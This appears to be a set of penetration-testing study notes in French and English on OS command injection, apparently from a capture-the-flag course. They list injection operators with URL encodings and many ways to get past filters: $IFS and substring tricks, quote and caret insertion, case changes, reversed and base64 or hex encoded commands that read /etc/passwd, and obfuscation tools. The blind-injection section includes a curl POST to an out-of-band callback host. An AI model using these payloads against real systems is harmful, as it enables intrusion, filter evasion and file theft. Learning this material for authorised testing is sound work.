
> [!TIP]
> TESTER TOUTES LES ENTREES POSSIBLES

# **OPERATORS**

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | ;                       | `%3b`                     | Both                                       |
| New Line               | \n                      | `%0a`                     | Both                                       |
| Background             | &                       | `%26`                     | Both (second output generally shown first) |
| Pipe                   | \|                      | `%7c`                     | Both (only second output is shown)         |
| AND                    | &&                      | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | \|\|                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ``                      | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | $()                     | `%24%28%29`               | Both (Linux-only)                          |


# **BYPASS BLACKLISTED CHARCTERS & COMMANDS**

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

## **Caractères**

### LINUX

| Caractère | Bypass<br>            | Bypass avec ASCII (man ascii) |     |
| --------- | --------------------- | ----------------------------- | --- |
| SPACE     | ${IFS}, TAB, {ls,-la} |                               |     |
| /         | ${PATH:0:1}           | $(tr '!-}' '"-~'<<<'.')       |     |
| ;         | ${LS_COLORS:10:1}     | $(tr '!-}' '"-~'<<<':')       |     |
| &         | $(tr '!-}' '"-~'<<<%) | $(tr '!-}' '"-~'<<<'%')       |     |
| \|        |                       | $(tr '!-}' '"-~'<<<'{')       |     |
| .         |                       | $(tr '!-}' '"-~'<<<'-')       |     |
| $         |                       | $(tr '!-}' '"-~'<<<'#')       |     |
| >         |                       | $(tr '!-}' '"-~'<<<'=')       |     |

### WINDOWS

| Caractère | Bypass CMD<br>        | Bypass PSH       |
| --------- | --------------------- | ---------------- |
| SPACE     | ${IFS}, TAB, {ls,-la} |                  |
| \         | %HOMEPATH:~6,-11%     | $env:HOMEPATH[0] |
| ;         |                       | $env:PATHEXT[4]  |
|           |                       |                  |
|           |                       |                  |
|           |                       |                  |

## Blind injection

```
127.0.0.1
curl -X POST http://gquhdtcawfxbjaqfaygorhe3ioblylj0g.oast.fun -d 'test'
```

## **Commandes**

### LINUX & WINDOWS

Les quotes et doubles quotes ne doivent pas être mélangés et un nombre pair

```shell-session
w'h'o'am'i
```

```shell-session
w"h"o"am"i
```

### LINUX

```bash
w\ho\am\i
```

```bash
who$@ami
```

### WINDOWS

```cmd-session
who^ami
```


### **Manipulation de la casse**

#### LINUX

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

```bash
$(tr "[A-Z]" "[a-z]"<<<'W'hOaM'i')
```

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

#### WINDOWS

```powershell-session
WhOaMi
```

### **REVERSE**

#### LINUX

```bash
echo 'whoami' | rev
```

```bash
$(rev<<<'imaohw')
```

#### WINDOWS

```powershell-session
"whoami"[-1..-20] -join ''
```

```powershell-session
iex "$('imaohw'[-1..-20] -join '')"
```

### **ENCODAGE**

#### LINUX
##### *BASE64 UTF8*

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```
##### *BASE64 UTF8*

```BASH
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```


<<< = \n

```BASH
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

##### *HEX*

```bash
echo -n 'cat /etc/passwd | grep 33' | xxd
```

<<< = \n

```BASH
bash<<<$(xxd -p -r<<<636174202f6574632f706173737764207c2067726570203333)
```

#### WINDOWS

##### *BASE64 UTF16*

```powershell-session
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```


# AUTOMATED OBFUSCATION TOOLS
## **LINUX**

### *BASHFUSCATOR*

#### INSTALL

```bash
git clone https://github.com/Bashfuscator/Bashfuscator;
cd Bashfuscator;
pip3 install setuptools==65;
python3 setup.py install --user
```
#### RUN

```bash
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 --test
```

## **WINDOWS**
### *DOSfuscation*

#### INSTALL

```powershell-session
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git;
cd Invoke-DOSfuscation;
Import-Module .\Invoke-DOSfuscation.psd1;
Invoke-DOSfuscation;
```
#### RUN

```powershell-session
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
```

```powershell-session
encoding
```

```powershell-session
1
```


